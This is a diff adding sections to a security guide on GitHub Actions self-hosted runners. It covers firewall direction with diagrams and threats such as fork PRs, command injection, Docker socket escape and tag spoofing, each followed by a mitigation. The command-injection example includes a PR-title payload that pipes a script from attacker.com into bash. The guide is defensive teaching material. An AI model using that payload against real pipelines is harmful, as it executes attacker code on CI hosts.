@@ -148,12 +148,65 @@ uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # Pin to v4.1.6 
 
 For workloads requiring access to private networks, custom operating systems, or heavy compute resources, organizations host their own runners.
 
-### A. Communication Topology
-Self-Hosted Runners do not require inbound firewall access. Instead, the runner agent daemon establishes a secure, outbound-only HTTPS connection (port 443) using WebSockets (long-polling) to communicate with GitHub's control plane.
+### A. Communication Topology: Inbound Webhooks vs. Outbound Polling
+Understanding the network direction and POV of the corporate firewall is essential for secure runner administration.
 
-```text
-[Self-Hosted Runner VM] ---> Outbound (443 WebSockets/HTTPS) ---> [GitHub API Gateway]
-  (No Inbound Ports Open)
+#### 1. Inbound "Push" Model (Traditional Jenkins Webhooks)
+In this model, the CI/CD server is passive and expects inbound triggers from the public internet.
+
+*   **The Flow:**
+    ```text
+    [GitHub.com (Public)] ---> Inbound HTTP POST (Port 443) ---> [Firewall Border] ---> [Jenkins Server (Private)]
+    ```
+*   **Company Firewall POV (Inbound):** An external server initiates a session into the private subnet.
+*   **The Penalty:** The network administrator must open inbound ports (80/443) on the perimeter firewall. This exposes the Jenkins server to public port scans, creating a vector for lateral entry into the corporate subnet if the application layer is compromised.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Developer
+    participant GitHub as GitHub.com (Public Cloud)
+    box Purple Company Network Border (Firewall)
+        participant Firewall
+    end
+    participant Jenkins as Jenkins Server (Private IP: 10.0.0.5)
+
+    Developer->>GitHub: Git Push
+    Note over GitHub: Webhook Triggered!
+    GitHub->>Firewall: Inbound HTTP POST to http://jenkins.mycompany.com (Port 80/443)
+    Note over Firewall: Must open port inbound to the public internet!
+    Firewall->>Jenkins: Forward Webhook payload to Jenkins
+    Note over Jenkins: Jenkins triggers build
+```
+
+#### 2. Outbound "Pull" Model (GitHub Actions Self-Hosted Runners)
+In this model, the runner agent daemon running inside the private subnet is the active initiator.
+
+*   **The Flow:**
+    ```text
+    [GHA Runner VM (Private)] ---> Outbound WebSocket (Port 443 HTTPS) ---> [Firewall Border] ---> [GitHub API (Public)]
+    ```
+*   **Company Firewall POV (Outbound):** An internal machine initiates a session outwards to a public website. Perimeter firewalls naturally permit outbound HTTPS (port 443) traffic.
+*   **The Advantage:** No inbound ports are opened. GitHub sends job payloads back down the active, internally initiated WebSocket tunnel (long-polling), leaving the corporate network border secure.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Developer
+    participant GitHub as GitHub.com (Public Cloud)
+    box Purple Company Network Border (Firewall)
+        participant Firewall
+    end
+    participant Runner as GHA Runner VM (Private IP: 10.0.0.10)
+
+    Runner->>Firewall: Outbound WebSocket Connection (Port 443 HTTPS)
+    Firewall->>GitHub: Connect to GitHub API & Long-Poll (Tunnel Established)
+    Note over GitHub: Tunnel remains open and waiting...
+    Developer->>GitHub: Git Push
+    Note over GitHub: Job queued in cloud
+    GitHub-->>Firewall: Send job payload DOWN the established tunnel
+    Firewall-->>Runner: Receive Job payload
+    Note over Runner: Execute steps locally (No inbound ports open!)
 ```
 
 ### B. Security Risks, Sandboxing & Persistent VM State (Dirty State)
@@ -174,6 +227,43 @@ To secure persistent self-hosted runners, organizations implement the following 
 3.  **Ephemeral VM Autoscaling:** Instead of a single persistent server, use automated controller groups (like the Actions Runner Controller - ARC) to spin up short-lived, ephemeral runners on Kubernetes or cloud VM templates. Each runner agent processes exactly one job and is immediately terminated and rebuilt from a clean image.
 4.  **Runner Group Partitioning:** Segregate runners into logical groups. Assign highly trusted repositories to group runners residing in secure subnets, and place public/untrusted repos in isolated sandboxed networks.
 5.  **Untrusted Fork Restrictions:** Disable automatic execution of pull requests originating from forks unless approved by a repository administrator.
+
+### C. Threat Modeling & Vulnerability Vectors (How Things Go Wrong)
+While self-hosted runners offer firewall security at the network border, they introduce unique application-level security threats. Understanding how "nothing is 100% secure" is vital for security hardening:
+
+#### 1. The Fork PR Minefield (Remote Code Execution & Network SSRF)
+*   **The Threat:** If a public repository (or a repository shared with untrusted partners) is configured to use a self-hosted runner, an attacker can fork the repo, modify the workflow YAML (e.g., `ci.yml`) to add malicious scripts, and submit a Pull Request.
+*   **The Blast Radius:** GHA's default behavior is to run the PR build automatically. Because the runner is a persistent VM sitting deep inside your private corporate network, the attacker's PR code executes **directly on your internal server**. 
+*   **Actionable Exploit:** The attacker can run command-line scans (`nmap`) to map your internal company network, steal local database credentials, hit the AWS metadata endpoint (SSRF) to hijack runner IAM roles, or install cryptominers.
+*   **Mitigation:** Set the repository runner settings to **"Require approval for all outside collaborators"** before running workflows. Never hook public repositories to internal self-hosted runners.
+
+#### 2. Command Injection via Untrusted Contexts
+*   **The Threat:** Evaluating untrusted user inputs (like PR titles, issue bodies, or commit messages) directly in inline shell scripts.
+*   **Vulnerable Syntax:**
+    ```yaml
+    - name: Log PR Title
+      run: echo "PR Title: ${{ github.event.pull_request.title }}"
+    ```
+    If an attacker submits a PR with the title: `"; curl -fsSL http://attacker.com/leak.sh | bash; #"`, the GHA orchestrator performs string replacement *before* sending it to the runner. The runner executes:
+    `echo "PR Title: "; curl -fsSL http://attacker.com/leak.sh | bash; #"`
+    This executes the attacker's script immediately on the host.
+*   **Mitigation:** Never write expressions directly into shell run commands. Always map them to intermediate environment variables first, which forces the shell to treat them as safe data rather than executable instructions:
+    ```yaml
+    - name: Log PR Title
+      env:
+        PR_TITLE: ${{ github.event.pull_request.title }}
+      run: echo "PR Title: $PR_TITLE"
+    ```
+
+#### 3. Docker Socket Mount Escapes (Host Hijacking)
+*   **The Threat:** To build Docker images inside containerized jobs, developers often mount the host VM's Docker socket: `-v /var/run/docker.sock:/var/run/docker.sock`.
+*   **The Blast Radius:** The Docker daemon runs with root privileges on the host VM. Anyone inside the container who can write to `/var/run/docker.sock` can instruct the host VM's Docker engine to launch a new container, mount the host's root directory (`/`), and execute commands. This completely bypasses container isolation, giving the attacker root control of the physical/VM host.
+*   **Mitigation:** Avoid mounting the Docker socket in untrusted jobs. Use rootless container building tools (like `Kaniko` or `buildah`) that do not require root socket access.
+
+#### 4. Action Supply Chain Poisoning (Tag Spoofing)
+*   **The Threat:** Using public marketplace actions pinned to tags: `uses: thirdparty/action@v1`.
+*   **The Blast Radius:** Git tags are mutable. If the maintainer's account is compromised, or if the maintainer acts maliciously, they can delete tag `v1` and point it to a new commit containing malicious code (e.g. keyloggers or token uploaders).
+*   **Mitigation:** Hard-pin external actions to their 40-character hexadecimal commit SHA. It is cryptographically impossible for an attacker to rewrite a commit SHA, ensuring supply chain integrity.
 
 ---
 
